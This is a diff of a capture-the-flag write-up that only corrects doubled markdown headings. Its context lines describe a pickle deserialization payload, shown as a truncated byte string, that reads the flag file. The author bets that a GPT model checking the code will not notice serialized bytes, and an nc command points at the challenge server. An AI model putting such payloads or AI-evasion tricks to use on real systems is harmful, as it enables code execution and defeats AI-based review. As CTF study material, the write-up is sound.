@@ -29,7 +29,7 @@ The server then executes the reconstructed code. So, the goal of this challenge 
 
 
 
-## ## Exploitation Scenario
+## Exploitation Scenario
 
 I thought the idea about [executing arbitrary code using pickle deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization#pickle). I supposed that the GPT model would not notice a series of bytes that are serialized using pickle. So, I wrote the following code to execute `$ cat /flag` when the serialized bytes are deserialized.
 
@@ -43,7 +43,7 @@ pickle.loads(b'\x80\x04\x95$\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x0
 
 
 
-## ## Exploit
+## Exploit
 
 ````bash
 $ nc -v -N 47.89.192.246 1337
